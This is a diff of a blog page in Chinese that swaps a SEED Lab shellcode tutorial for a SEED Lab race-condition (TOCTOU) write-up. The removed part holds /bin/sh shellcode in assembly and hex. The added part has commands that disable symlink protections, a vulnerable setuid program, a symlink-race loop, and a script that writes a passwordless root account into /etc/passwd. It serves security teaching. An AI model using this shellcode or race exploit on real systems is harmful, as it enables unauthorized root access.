@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SEEDLAB_SHELLCODE, Yssx&#39;s Blog">
+    <meta name="keywords" content="SEEDLAB_Race-Condition, Yssx&#39;s Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SEEDLAB_SHELLCODE | Yssx&#39;s Blog</title>
+    <title>SEEDLAB_Race-Condition | Yssx&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SEEDLAB_SHELLCODE</h1>
+                    <h1 class="description center-align post-title">SEEDLAB_Race-Condition</h1>
                 </div>
             </div>
         </div>
@@ -456,7 +456,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-05-24
+                    2026-05-25
                 </div>
                 
 
@@ -465,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.4k
                 </div>
                 
 
@@ -495,119 +495,103 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SHELLCODE编写"><a href="#SHELLCODE编写" class="headerlink" title="SHELLCODE编写"></a>SHELLCODE编写</h1><p>关于汇编代码的相关知识不再赘述，本文将根据实验内容讲解常见的shellcode编写方法</p>
-<h2 id="shellcode去0"><a href="#shellcode去0" class="headerlink" title="shellcode去0"></a>shellcode去0</h2><p>首先我们要明确一点，正常的shellcode一般都是需要通过strcpy等函数放到指定地点的。那么自然而然，shellcode的机器码中不能包含0x00便成了很重要的一个因素</p>
-<p>那么我们该如何去除机器码中的0元素呢？以下介绍了在不同情况下的方法</p>
-<h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><p>我们可以将 <code>mov rax,0</code>等指令转化为 <code>xor rax,rax</code>，防止在立即数中出现0x00；如果出现赋非0值比如 <code>mov rax,0x99</code>的情况，则可以采取 <code>xor rax,rax;mov al,0x99</code>,通过对低字节的直接操作来避免立即数中出现0x00</p>
-<p>此外，我们还可以通过移位的方式来完成赋值，该方式更加灵活直观。同样存储0x99，我们可以如下操作。</p>
-<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov  rax, 0xFFFFFFFFFFFFFF99
-shl  rax, 56
-shr  rax, 56<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+                <h1 id="竞态攻击实验"><a href="#竞态攻击实验" class="headerlink" title="竞态攻击实验"></a>竞态攻击实验</h1><p>为配置攻击可复现环境，在官方提供的Ubuntu20.4虚拟环境中，我们要执行以下命令以关闭保护</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">fs.protected_symlinks</span><span class="token operator">=</span><span class="token number">0</span>
+<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token assign-left variable">fs.protected_regular</span><span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="字符串结尾"><a href="#字符串结尾" class="headerlink" title="字符串结尾"></a>字符串结尾</h3><p>众所周知，字符串是以0x00结尾的，则必然会导致0字节的出现，那么我们在汇编代码的编写中就要注意：可以将 <code>db &quot;/bin/sh&quot;,0x00</code>更换为 <code>db &quot;/bin/sh&quot;,0xff</code>这里的0xff则可以等到后续动态替换</p>
-<p>假设我们已将字符串的地址保存到rbx，我们还知道字符串的长度（不包括零）为6，因此可以使用以下指令将0xFF替换为0x00。</p>
-<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">xor al, al
-mov [rbx+6], al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>首先给出我们的漏洞程序,标注here的两处存在竞态漏洞。注意，该程序应该为root所有的Set_uid程序</p>
+<p>在检查（access）和使用（fopen）之间存在一个时间窗口，这段时间里，被access()检查的文件可能与被fopen()使用的文件不是同一个，尽管它们具有相同的文件名&#x2F;tmp&#x2F;XYZ。如果攻击者能够在该时间窗口内使&#x2F;tmp&#x2F;XYZ成为指向&#x2F;etc&#x2F;passwd的符号链接，则可以导致用户输入被添加到&#x2F;etc&#x2F;passwd中，由此获得root权限。由于该漏洞运行在root权限下，因此它有权限修改任何文件。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
-<h2 id="编写方法一"><a href="#编写方法一" class="headerlink" title="编写方法一"></a>编写方法一</h2><p>先直接给出方法一的对应汇编代码</p>
-<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">section .text
-  global _start
-    _start:
-	BITS 64
-	jmp short two
-    one:
- 	pop rbx         
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span><span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token string">"/tmp/XYZ"</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    FILE<span class="token operator">*</span> fp<span class="token punctuation">;</span>
 
- 	mov [rbx+29],  rbx  ; store rbx to memory at address rbx + 8
-	xor rax, rax      ; rax &#x3D; 0
- 	mov [rbx+7], al
- 	mov [rbx+10], al
- 	mov [rbx+28], al
- 
- 	lea rcx,[rbx+8]
- 	mov [rbx+37],rcx
- 	lea rcx,[rbx+11]
- 	mov [rbx+45],rcx
- 	mov [rbx+53], rax  ; store rax to memory at address rbx + 16
+    <span class="token comment">/* get user input */</span>
+    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%50s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        mov rdi, rbx       ; rdi &#x3D; rbx
- 	lea rsi, [rbx+29]   ; rsi &#x3D; rbx + 8  
-        xor rdx, rdx      ; rdx &#x3D; 0
- 	mov eax, 0xffffff3b        ; rax &#x3D; 59
- 	shl eax, 24
- 	shr eax, 24
- 	syscall
-     two:
-        call one                                                                 
-        db &#39;&#x2F;bin&#x2F;sh&#39;, 0xFF ; The command string (terminated by a zero)
-        db &#39;-c&#39;,0xFF	   ;+8
-        db &#39;echo hello;ls -la&#39;,0xFF ;+11
-        db &#39;AAAAAAAA&#39;      ; Place holder for argv[0] ;+29
- 	db &#39;AAAAAAAA&#39;      ; Place holder for argv[1] ;+37
- 	db &#39;AAAAAAAA&#39;      ; Place holder for argv[2] ;+45
- 	db &#39;AAAAAAAA&#39;      ; Place holder for argv[3] ;+53
- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> W_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//here</span>
+        fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//here</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Open failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No permission \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-<p>我们在代码开头使用jmp ，call的连续跳转，可将30行的字符串地址压入栈中，在通过 <code>pop rbx</code>获取字符串部分的基址，便于后续定位</p>
-<p>同时此段代码专门为argv数组占位，动态载入程序的真实地址，如下所示。同时使用到了先前所说的去0方法</p>
-<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov [rbx+29], rbx
-mov [rbx+37], rcx
-mov [rbx+45], rcx
-mov [rbx+53], rax  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>对代码进行验证</p>
-<p><img src="/2026/05/24/seedlab-shellcode/1779626517087.png" alt="运行结果"></p>
-<p><img src="/2026/05/24/seedlab-shellcode/1779626553532.png" alt="去0验证"></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了占位法以外，我们还可以使用压栈法进行地址的动态定位来编写shellcode，代码如下</p>
-<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">section .text
-global _start
-  _start:
-    xor  rdx, rdx       ; 3rd argument (stored in rdx)env
-    push rdx
-    mov rax,&#39;&#x2F;bin&#x2F;&#x2F;sh&#39;  
-    push rax
-    mov rdi, rsp        ; 1st argument (stored in rdi)
+<h2 id="任务一：选择目标"><a href="#任务一：选择目标" class="headerlink" title="任务一：选择目标"></a>任务一：选择目标</h2><p>为了验证竞态攻击确实可以得到root权限，我们将攻击目标定为普通用户不可写的&#x2F;etc&#x2F;passwd;希望在竞态时间窗口实现新建一个root权限用户的操作</p>
+<p>首先介绍一下用户记录的格式，这里是root用户的示例，依次为：用户名、密码占位符、用户ID、组ID、用户描述信息、用户目录、用户登录shell</p>
+<pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-    push rdx		
-    push rdi
-    mov rsi, rsp        ; 2nd argument (stored in rsi)argv
+<p>对于root用户来说，第三个字段（用户ID字段）的值为0。也就是说，其进程的用户ID将被设置为0，从而赋予该进程root权限。所以如果想创建一个具有root权限的新帐户，只需在该字段中放入0即可。</p>
+<p>在上面的示例中，密码字段设置为”x”，表示密码存储在名为&#x2F;etc&#x2F;shadow的文件中。这就意味着我们还需要利用竞态条件漏洞在shadow文件中也添加一条记录，这并不难做到。</p>
+<p>但我们有更简单的方法。与其将”x”放入密码文件中，我们可以直接将密码放在密码字段，这样操作系统就不会去shadow文件中查找密码。密码字段并不存放实际的密码，而是存储其单向哈希值。为了得到一个密码的单向哈希值，我们可以在自己的系统中使用adduser命令创建一个新用户，并从shadow文件中获取该密码的单向哈希值。</p>
+<p>有趣的是，Ubuntu中有一个用于无口令帐户的神奇值，该值为U6aMy0wojraho（空字符串的哈希）。如果我们把这个值放在用户记录的密码字段内，不需要密码就可以进入到这个用户的账号。</p>
+<p>为了验证这个神奇的哈希值是否为真，我们以root身份修改用户记录文件，添加记录如下</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779691093580.png" alt="修改&#x2F;etc&#x2F;passwd"></p>
+<p>验证结果确实无需密码就能登录，同时获取了root权限</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779691151326.png"></p>
+<h2 id="任务二：发起攻击"><a href="#任务二：发起攻击" class="headerlink" title="任务二：发起攻击"></a>任务二：发起攻击</h2><p>本任务的目的是利用上述setuid程序中的竞态条件漏洞获得root权限。攻击中最关键的步骤，即让&#x2F;tmp&#x2F;XYZ指向密码文件，必须发生在access()和fopen()调用之间</p>
+<h3 id="Cheat-mode"><a href="#Cheat-mode" class="headerlink" title="Cheat mode"></a>Cheat mode</h3><p>初始阶段，为了保证我们有充足的时间窗口进行攻击尝试，我们可以模拟一台慢速机器进行操作，提供10s的攻击窗口</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> W_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-    xor  rax, rax
-    mov  al, 59        ; execve()
-    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>为了验证攻击后可以获取root权限，我们 <code>sudo touch try_file</code>来创建一个特权文件。仅Root状态下可以写入</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779691641152.png" alt="普通用户无法写入"></p>
+<p>接下来，我们先在tmp目录下创建XYZ文件，然后运行vulp_slow，并通过scanf输入写入文件的字符串。</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779692365285.png" alt="1779692365285"></p>
+<p>按下回车以后，将有10s的停顿，此时将XYZ链接到特权文件。<img src="/2026/05/25/seedlab-race-condition/1779692459309.png" alt="1779692459309"></p>
+<p>即可通过竞态漏洞成功写入特权文件</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779692527536.png" alt="1779692527536"></p>
+<h3 id="Real-Attack"><a href="#Real-Attack" class="headerlink" title="Real  Attack"></a>Real  Attack</h3><p>前面的任务中，我们手动为程序运行减速，实际上算是cheat了，但接下来将进行真正的攻击。</p>
+<p>竞态条件攻击中的典型策略是在目标程序运行时并行运行攻击程序，希望关键步骤能够在小时间窗口内完成。我们可以反复进行攻击，直到成功为止。</p>
+<p>由于Unlink将会删除原先的链接文件，所以我们代码设计如下（seed为普通用户权限）。借助权限的轮转来通过access的检查，同时每次循环留出部分时间供vlup调度</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">seed</span> <span class="token string">"/home/seed/Desktop/Labsetup6/try"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">rot</span> <span class="token string">"/etc/passwd"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">symbol</span> <span class="token string">"/tmp/XYZ"</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token function">unlink</span><span class="token punctuation">(</span>symbol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">symlink</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span>symbol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">unlink</span><span class="token punctuation">(</span>symbol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">symlink</span><span class="token punctuation">(</span>rot<span class="token punctuation">,</span>symbol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>首先 <code>xor rdx,rdx</code>将env数组设为NULL，其次 <code>push rdx;push rax</code>此处的rdx可以作为&#x2F;bin&#x2F;&#x2F;sh后的结尾0x00来使用，同时 <code>mov rdi,rsp</code>将字符串地址赋给rdi；</p>
-<p>同理 <code>push rdx;push rdi</code>则是按照argv[1],argv[0]的顺序入栈，构造argv数组.再通过 <code>mov rsi,rsp</code>的方式传入数组地址。从而将syscall所需的参数全部凑齐</p>
-<p>代码演示结果如下</p>
-<p><img src="/2026/05/24/seedlab-shellcode/1779626950490.png"></p>
-<h2 id="攻击中使用shellcode"><a href="#攻击中使用shellcode" class="headerlink" title="攻击中使用shellcode"></a>攻击中使用shellcode</h2><p>为了在实际攻击中使用shellcode，我们常常将其转化为机器码的形式导入</p>
-<p>为了获取纯粹的代码段，我们可以使用指令 <code>nasm -f bin mysh64_yssx.s -o shellcode.bin</code>编译汇编代码（注意，代码中需要显示声明BITs 64&#x2F;32）</p>
-<p>接下来使用 <code>xxd -p -c 20 shellcode.bin</code>获取机器码，结果如下</p>
-<p><img src="/2026/05/24/seedlab-shellcode/1779627592746.png" alt="机器码演示"></p>
-<p>同时，为了在python中直接导入机器码，我们可以使用python脚本做一点处理</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<p>除攻击程序外，还设计了脚本用于循环启动vulp并在合适时机停止攻击（&#x2F;etc&#x2F;passwd出现变化时）。此处我们使用echo与管道将期望内容写入文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+  
+<span class="token assign-left variable">CHECK_FILE</span><span class="token operator">=</span><span class="token string">"ls -l /etc/passwd"</span>
+<span class="token assign-left variable">old</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span>
+<span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span>
+<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$old</span>"</span> <span class="token operator">==</span> <span class="token string">"<span class="token variable">$new</span>"</span> <span class="token punctuation">]</span>  
+<span class="token keyword">do</span>
+   <span class="token builtin class-name">echo</span> <span class="token string">"yssx:U6aMy0wojraho:0:0:yssx:/root:/bin/bash"</span> <span class="token operator">|</span> ./vulp   
+   <span class="token assign-left variable">new</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>$CHECK_FILE<span class="token variable">)</span></span>
+<span class="token keyword">done</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"STOP... The passwd file has been changed"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token comment"># Run "xxd -p -c 20 rev_sh.o",</span>
-<span class="token comment"># copy and paste the machine code to the following:</span>
-ori_sh <span class="token operator">=</span><span class="token triple-quoted-string string">"""
-4831d25248b82f62696e2f2f73685048
-89e752574889e64831c0b03b0f05
-"""</span>
-
-sh <span class="token operator">=</span> ori_sh<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
-
-length  <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Length of the shellcode: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
-s <span class="token operator">=</span> <span class="token string">'shellcode= (\n'</span> <span class="token operator">+</span> <span class="token string">'   "'</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">+=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> sh<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> sh<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
-    <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">15</span><span class="token punctuation">:</span> 
-       s <span class="token operator">+=</span> <span class="token string">'"\n'</span> <span class="token operator">+</span> <span class="token string">'   "'</span>
-s <span class="token operator">+=</span> <span class="token string">'"\n'</span> <span class="token operator">+</span> <span class="token string">").encode('latin-1')"</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这样出来的结果就如下图所示，可以直接使用了</p>
-<p><img src="/2026/05/24/seedlab-shellcode/1779627738799.png" alt="Convert结果"></p>
+<p>攻击结果如下</p>
+<p><img src="/2026/05/25/seedlab-race-condition/1779694063993.png" alt="成功添加root权限账户"></p>
 
                 
             </div>
@@ -634,7 +618,7 @@ s <span class="token operator">+=</span> <span class="token string">'"\n'</span>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Yssx-g.github.io/2026/05/24/seedlab-shellcode/">https://Yssx-g.github.io/2026/05/24/seedlab-shellcode/</a>
+                    <a href="https://Yssx-g.github.io/2026/05/25/seedlab-race-condition/">https://Yssx-g.github.io/2026/05/25/seedlab-race-condition/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -980,9 +964,10 @@ s <span class="token operator">+=</span> <span class="token string">'"\n'</span>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/05/25/seedlab-race-condition/">
                     <div class="card-image">
@@ -1000,9 +985,9 @@ s <span class="token operator">+=</span> <span class="token string">'"\n'</span>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-05-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1015,6 +1000,7 @@ s <span class="token operator">+=</span> <span class="token string">'"\n'</span>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1033,19 +1019,19 @@ s <span class="token operator">+=</span> <span class="token string">'"\n'</span>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/05/24/seedlab-format-string/">
+                <a href="/2026/05/24/seedlab-shellcode/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="SEEDLAB-FORMAT_STRING">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="SEEDLAB_SHELLCODE">
                         
-                        <span class="card-title">SEEDLAB-FORMAT_STRING</span>
+                        <span class="card-title">SEEDLAB_SHELLCODE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Format_String/）
+                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Shellcode/）
                         
                     </div>
                     <div class="publish-info">
